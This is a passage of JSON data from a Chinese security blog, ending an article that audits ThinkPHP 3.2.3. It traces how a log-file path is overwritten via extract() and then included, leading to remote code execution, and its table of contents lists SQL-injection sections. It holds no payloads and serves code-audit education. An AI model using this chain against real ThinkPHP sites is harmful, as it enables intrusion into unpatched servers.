src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549184.png\" alt=\"在这里插入图片描述\"><br>首先判断了模板文件是否存在<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549240.png\" alt=\"在这里插入图片描述\"><br>而后检验使用的是否是PHP原生模板，系统配置的默认引擎是<code>Think</code>，所以这里走else<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549299.png\" alt=\"在这里插入图片描述\"><br>这里可以看到将<code>$this-&gt;tVar</code>的值赋给了<code>$params</code>，而后进入了listen函数，跟进此函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549415.png\" alt=\"在这里插入图片描述\"></p>\n<p>发现这里经过一些判断后进入了exec函数，跟进此函数<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549470.png\" alt=\"在这里插入图片描述\"><br>可以发现这里是调用<code>Behavior\\ParseTemplateBehavior</code>类中的<code>run</code>方法处理<code>$params</code>，我们跟进run方法，寻找哪里对日志文件路径进行了处理，最终找到<code>ThinkPHP\\Library\\Think\\Template.class.php</code>文件下的<code>fetch</code>方法<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549618.png\" alt=\"在这里插入图片描述\"><br><code>loadTemplate</code>函数是读取文件路径的，而后这里用load函数对其进行了处理，我们跟进此函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549628.png\" alt=\"在这里插入图片描述\"><br><code>$_filename</code>是之前获取到的的缓存文件路径，<code>$vars</code>是带有变量<code>_filename</code>的数组，这里的<code>$vars</code>不为空，因此使用<code>extract</code>方法的<code>EXTR_OVERWRITE</code>默认描述对变量值进行覆盖<br>最后<code>include</code>日志文件路径，造成文件包含，最终导致包含文件造成RCE</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://www.freebuf.com/articles/web/345544.html\">https://www.freebuf.com/articles/web/345544.html</a><br><a href=\"https://www.freebuf.com/vuls/282906.html\">https://www.freebuf.com/vuls/282906.html</a><br><a href=\"https://mp.weixin.qq.com/s/OqfruwHf9CAt--2dQQfNJw\">https://mp.weixin.qq.com/s/OqfruwHf9CAt–2dQQfNJw</a><br><a href=\"https://forum.butian.net/share/546\">https://forum.butian.net/share/546</a></p>\n","feature":true,"text":"前言MVC框架是代码审计必需学习的知识，这里以TpV3.2.3框架为例，进行一次对MVC框架代码的漏洞审计，简单学一下MVC的相关知识，希望对正在学习MVC框架的师傅有所帮助 框架我们这里首先需要了解一下什么是MVC架构 M：Model(模型)，其负责业务数据的处理和与数据库的交...","link":"","photos":[],"count_time":{"symbolsCount":"9.7k","symbolsTime":"9 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%A1%86%E6%9E%B6\"><span class=\"toc-text\">框架</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#TP3\"><span class=\"toc-text\">TP3</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">目录文件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%B7%AF%E7%94%B1%E6%A0%BC%E5%BC%8F\"><span class=\"toc-text\">路由格式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#pathinfo%E6%A8%A1%E5%BC%8F\"><span class=\"toc-text\">pathinfo模式</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%99%AE%E9%80%9A%E6%A8%A1%E5%BC%8F\"><span class=\"toc-text\">普通模式</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%BC%E5%AE%B9%E6%A8%A1%E5%BC%8F\"><span class=\"toc-text\">兼容模式</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#rewrite-%E6%A8%A1%E5%BC%8F\"><span class=\"toc-text\">rewrite 模式</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%AE%8A%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">特殊方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#I%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">I方法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#M%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">M方法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#C%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">C方法</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\"><span class=\"toc-text\">漏洞分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SQL注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#where%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">where注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#exp%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">exp注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#bind%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">bind注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">命令执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1\"><span class=\"toc-text\">漏洞分析</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">参考链接</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"JAVA安全基础入门篇","uid":"8bd1f2733cc5f9b409baa8184367dcbe","slug":"JAVA安全入门篇","date":"2023-01-19T16:51:30.000Z","updated":"2024-02-14T08:04:40.000Z","comments":true,"path":"api/articles/JAVA安全入门篇.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141603315.png","text":"声明文章首发于先知社区https://xz.aliyun.com/t/13284 JAVA 反射定义什么是JAVA 反射。接下来引用一下Y4tacker大师傅的话 Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":6,"path":"api/tags/JAVA安全.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"浅析Flask Session伪造","uid":"ac14ba8545a9348cf23ed9e993a44b8f","slug":"Flask Session伪造","date":"2023-01-05T14:55:20.000Z","updated":"2023-07-24T08:43:50.000Z","comments":true,"path":"api/articles/Flask Session伪造.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141552551.jpeg","text":"前言Flask的Session伪造之前并未有太多了解，在跨年夜的CatCTF中遇到了catcat这道题，因此对此类题目进行一个简单总结，lx56大师傅已经对Flask有很详细的介绍了，因此这里是站在巨人的肩膀上看世界了属于是，膜拜大佬。 Flask什么是Flask呢，他其实是一个...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"FLask","slug":"FLask","count":3,"path":"api/tags/FLask.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}